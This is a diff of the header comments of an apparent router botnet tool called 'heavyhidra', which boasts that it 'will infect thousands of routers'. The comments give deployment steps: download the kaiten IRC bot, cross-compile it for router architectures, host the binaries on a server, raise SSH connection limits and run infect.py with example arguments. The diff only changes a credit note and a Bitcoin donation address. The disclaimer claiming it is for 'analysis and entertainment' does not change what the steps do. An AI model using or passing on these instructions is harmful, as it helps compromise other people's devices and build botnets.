@@ -2,7 +2,7 @@
 #~WhitePacket
 #Lightaidra sucked, so here's 2.0 - will infect thousands of routers.
 # To setup, follow the instructions
-#-Download kaiten.c from https://dl.packetstormsecurity.net/irc/kaiten.c
+#-Download kaiten.c from https://dl.packetstormsecurity.net/irc/kaiten.c (I didn't create kaiten)
 #-Cross compile it to sh4, powerpc, mipsel, mips, and armv5l.
 #-Put the files in your htdocs directory of a server to host them named something sensible like kaiten-*, wildcard in place of the architecture name.
 # Set some stuff on your servers so you don't get capped at 476 open SSH connections.
@@ -11,7 +11,7 @@
 # Run heavyhidra
 #-python infect.py 376 LUCKY x 0
 #-python infect.py 376 B 113.53 1
-# Donate BTC: 13rddMd7ErFQYsjYPfYAnqxmPzZxQPrVyo
+# Donate BTC: 1JiyTFYsubsRzwj8uCtzxRirnr33wGS5YB
 #NOTE: I wrote this back when I didn't code professionally, and on Tuesday, September 8th 2015 I decided to officially release it. Don't expect quality code, but working code.
 #Disclaimer: use this for code analysis and entertainment purposes only. The code is quite funny, old, works incredibly well and you are completely liable for anything done on it. I do not permit execution of the following code:
 
